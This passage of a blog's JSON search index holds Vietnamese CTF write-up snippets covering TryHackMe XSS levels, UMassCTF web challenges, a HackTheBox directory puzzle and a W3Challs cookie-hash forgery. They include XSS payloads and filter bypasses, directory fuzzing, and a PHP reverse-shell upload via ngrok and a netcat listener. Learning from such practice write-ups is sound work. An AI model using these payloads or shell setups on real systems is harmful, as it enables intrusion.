javascript thực hiện việc lấy phần tử có class name là “name” và thiết lập nội dung cho nó là nội dung người dùng nhập vàoSử dụng một dấu nháy ( ‘ ) và dấu chấm phẩy để thoát khỏi câu lệnh hiện tại, sau đó đóng luôn thẻ script';&lt;/script&gt;&lt;script&gt;alert(\"THM\")&lt;/script&gt;Level 5Chuỗi nhập vào sẽ được hiển thị ngay dướiXem qua source codeChèn thử 1 đoạn script đơn giảnTa thấy từ “script” đã bị lọc khỏi inputNhưng thử viết hoa thì không bị filterTa có payload&lt;SCRIPT&gt;alert(\"THM\")&lt;/SCRIPT&gt;Level 6Ta nhập đường dẫn ảnh và ảnh sẽ được hiện thị phía dướiXem qua source codeTa có payload\" onerror=\"alert('THM')\"" }, { "title": "TestAgain", "url": "/posts/TestAgain/", "categories": "General, Test", "tags": "hello", "date": "2021-10-22 23:00:00 +0800", "snippet": "Finally, it works xDDIt’s time to comebackIt’s time to comebackIt’s time to comebackIt’s time to comebackIt’s time to comebackIt’s time to comebackIt’s time to comebackIt’s time to comebackIt’s time to comeback" }, { "title": "UMassCTF'21 - Web - heim Writeup", "url": "/posts/UMassCTFWriteUp2/", "categories": "Writeup, UMassCTF'21", "tags": "web, writeup", "date": "2021-03-29 07:00:00 +0800", "snippet": "UMassCTF’21 - Web - heimGiao diện của trang webMình thử nhập 1 cái tên bất kì và ấn enterOkay, mình được cấp 1 access token, nhưng để làm gì thì không ai nói :^(Mình thử fuzz trang web để tìm các thư mục con/file trong trang web bằng ffuf. Chi tiết như nào các bạn có thể tìm hiểu thêm tại đây Fuzzing web với FFUF. Thực ra có nhiều cách để làm việc này như dirbuster, dirsearch, . . . nhưng mình vừa học trên hackthebox academy cách này nên muốn thử :^.ffuf -u http://104.197.195.221:8081/FUZZ -w directory-list-2.3-medium.txtNgon lành :^Truy cập đường link nhưng . . .Có lẽ đây là lúc mình dùng access token được cấp :^ Loay hoay 1 hồi cuối cùng mình dùng curlVà nó báo token hết hạn =)) Chắc tại mình google hơi lâuLấy 1 access token mới và thử lại thì mình nhận đượcOke, mình không xứng đáng, chỉ có Odin mới có thể xem flag xDVà nhân danh bộ râu của Odin, mình gõ tên Odin để lấy access token :^Doneeeeee, flag là gì thì mình vẫn không nói nhé (¬‿¬)" }, { "title": "UMassCTF'21 - Web - Hermit-Part 1 Writeup", "url": "/posts/UMassCTFWriteUp/", "categories": "Writeup, UMassCTF'21", "tags": "web, writeup", "date": "2021-03-29 07:00:00 +0800", "snippet": "UMassCTF’21 - Web - Hermit-Part 1Truy cập vào trang web bằng 1 trong 2 link, đây là giao diện của trang web:Nhìn qua thì mình khá chắc đây là File Upload Attacks, chúng ta sẽ phải upload file reverse shell lên webserver. Theo kết quả của Wappalyzer mình biết được rằng hệ thống của web được code bằng PHPVậy nếu chúng ta có thể upload 1 file reverse shell được viết bằng PHP lên, tìm nơi chứa file đó và chạy được file, chúng ta sẽ có reverse shell. Bạn có thể tìm hiểu thêm về reverse shell ở đây. Mình chỉ giới thiệu bài viết bằng tiếng Việt vì tiếng Anh google cái ra rất nhiều xD. Tất nhiên mình vẫn khuyến khích các bạn đọc tài liệu tiếng Anh.Okay, quay lại chủ đề chính, mình sử dụng reverse shell php ở đâyĐây là lúc mình nhận ra thực tế và những bài mình làm trên Tryhackme hay hackthebox khác hoàn toàn. Ở Tryhackme hay hackthebox máy bạn và máy cần tần công nằm trong cùng 1 mạng, việc tấn công có thể dễ dàng hơn xD. Còn ở đây thì khác hoàn toàn. Mình loay hoay 1 hồi rồi nhớ ra ngrok. Ngrok là công cụ tạo đường hầm (tunnel) giữa localhost của bạn và internet, giúp người khác có thể truy cập được localhost thông qua custom domain của ngrok.Cài đặt ngrok và mở 1 cổng với giao thức TCP./ngrok tcp 666Mở cổng 666 với giao thức TCP, mở thành công sẽ hiển thị như sauSau đó mở port 666 để “nghe” với netcatnc -lvnp 666Xong xuôi hết, việc cuối cùng là chỉnh sửa file php reverse shellCó 2 giá trị ở đây cần thay đổi, đó là ip và portPort là cổng mình đã mở ở trên, còn ip là 2.tcp.ngrok.io (Giá trị của trường Forwarding trong thông báo của ngrok ở trên)Chỉnh sửa xong xuôi, việc tiếp theo là upload file lên, và oops :^(Có thể thấy webserver đã chặn không cho mình upload file đuôi php lên, nicetry :^. Mình thử bypass filter đấy bằng cách thêm đuôi .jpg vào và trông nó sẽ như thế này xDOkay, thử upload lại và mình đã upload thành côngClick vào See Image và mình lấy được reverse shellOkay, theo kinh nghiệm chơi mấy room trên tryhackme, mình tìm thử trong thư mục home đầu tiênBước cuối :))Ngoài lề tý, mình có để lại lời nhắn và có 1 ông nào đó đáp lại, khá vui =)))) Niềm vui nho nhỏ trong niềm vui to :^. Chall này giúp mình học thêm được khá nhiều thứ xD." }, { "title": "hackthebox- misc - misDIRection Writeup", "url": "/posts/htbWriteup/", "categories": "Writeup, hackthebox", "tags": "misc, writeup", "date": "2021-03-25 21:30:00 +0800", "snippet": "hackthebox - Misc - misDIRectionLink: https://app.hackthebox.eu/challenges/55Sau khi download và giải nén ta nhận được 1 folder .secret như sauMình check thử 1 vài thư mục conDùng lệnh tree để xem tổng quan cấu trúc thư mục:Ban đầu mình viết 1 script python dùng thư viện glob để liệt kê hết tên thư mục ra và đây là kết quả:./0/6./1/22./1/30./2/34./5/16./9/36./B/23./C/4./D/26./E/14./F/19./F/2./F/27./J/8./N/11./N/25./N/31./N/33./R/3./R/7./S/1./U/9./V/35./X/17./X/21./X/29./d/13./e/5./j/10./j/12./p/32./s/24./u/20./u/28./x/15./z/18Sau đó mình thử ghép các chữ số ở cuối thành 1 dãy số:6 22 30 34 16 36 23 4 26 14 19 2 27 8 11 25 31 33 3 7 1 9 35 17 21 29 13 5 10 12 32 24 20 28 15 18Và sau đó là betak =)))Okay quay xe, mình xem xét chuỗi kia và quyết định làm ngược lại, nghĩa là mình sẽ thử sắp xếp tên thư mục ở đầu theo thứ tự tăng dần của tên file trong thư mục (dãy số ở cuối).import globpath = './*/*'files = glob.glob(path)l = []for name in files: l.append(name[2:])dct ={}for s in l: dct[int(s.split(\"/\")[1])]=s.split(\"/\")[0]sorted_key = sorted(dct.keys())for i in sorted_key: print(dct[i],end=\"\")Sau khi chạy script sẽ được 1 chuỗi:SFRCe0RJUjNjdEx5XzFuX1BsNDFuX1NpN2V9Một thói quen của mình là khi thấy 1 chuỗi như vậy việc đầu check thử chiều dài của chuỗi xem có chia hết cho 4 không, nếu có khả năng cao nó là base64 xDDOkay, mình dùng CyberChef giả mã và nhận được flag, flag là gì thì mình không nói :^)Flag: HTB{DIR3ctLy_*************}" }, { "title": "W3Challs - Web - Authentication Writeup", "url": "/posts/w3challsWriteup/", "categories": "Writeup, W3Challs", "tags": "web, writeup", "date": "2021-03-24 20:45:00 +0800", "snippet": "W3Challs - Web - AuthenticationLink: https://w3challs.com/challenges/web/authenticationTruy cập linkMình click thử vào Administration và trang web báo lỗi “Forbidden Access! This part of the site is reserved to the admin!”Check cookie của trang web và mình thấy 1 cookie với tên name và giá trị “b14361404c078ffd549c03db443c3fede2f3e534d73f78f77301ed97d4a436a9fd9db05ee8b325c0ad36438b43fec8510c204fc1c1edb21d0941c00e9e2c1ce2”Sử dụng hash-identifier để xác định định dạng của chuỗi giá trị kia:Và mình được kết quả:Okay, thử crack trên CrackStation được kết quả là chuỗi “user” :Mã hóa SHA-512 cho chuỗi “admin”:Sha512(admin) = c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ecSử dụng chuỗi đã mã hóa SHA-512 của “admin” thay cho chuỗi giá trị có sẵn và tải lại trang và lấy được flag xD" }, { "title": "Hello World!!!", "url": "/posts/HelloWorld/", "categories": "General, Test", "tags": "hello", "date": "2021-03-21 23:00:00 +0800", "snippet": "Finally, it works xDDMy first post in my blog xDDDDDD. Hellooooooooooo" } ]
